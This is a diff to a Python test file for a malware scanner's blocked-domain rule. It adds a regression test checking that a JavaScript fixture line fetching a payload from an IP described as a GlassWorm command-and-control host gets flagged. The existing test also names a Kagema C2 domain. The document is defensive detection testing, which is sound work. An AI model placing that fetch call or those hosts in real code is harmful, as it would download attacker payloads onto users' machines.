@@ -60,3 +60,13 @@ def test_fires_on_kagema_c2_in_source(make_context: MakeContext) -> None:
     findings = BlacklistedDomainRule().evaluate(ctx)
     assert len(findings) == 1
     assert "niggboo.com" in findings[0].description
+
+
+def test_fires_on_glassworm_c2_ip_in_source(make_context: MakeContext) -> None:
+    # Regression: GlassWorm direct-IP C2/stager hosts are curated seed entries.
+    ctx = make_context(
+        files={"extension.js": 'fetch("http://217.69.11.60/get_zombi_payload/x");'}
+    )
+    findings = BlacklistedDomainRule().evaluate(ctx)
+    assert len(findings) == 1
+    assert "217.69.11.60" in findings[0].description
